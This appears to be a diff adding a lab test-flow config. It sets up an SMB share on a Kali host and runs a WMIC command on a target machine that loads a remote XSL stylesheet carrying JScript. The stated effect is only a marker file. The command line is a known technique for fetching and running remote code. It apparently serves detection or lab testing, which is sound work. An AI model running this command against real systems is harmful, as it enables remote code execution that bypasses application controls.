@@ -1,0 +1,7 @@
+flow=flow2-smb-jscript
+kali_service=smbd foreground instance bound to 192.168.1.50 TCP 445 using fixtures/smb.conf
+share=read-only guest share \\192.168.1.50\wmicxsl
+served_fixture=wmic-jscript-smb.xsl
+target=192.168.1.52
+command=C:\Windows\System32\wbem\WMIC.exe os get Caption /format:"\\192.168.1.50\wmicxsl\wmic-jscript-smb.xsl"
+effects=write C:\lab\wmic-smb-marker.txt through cmd.exe only
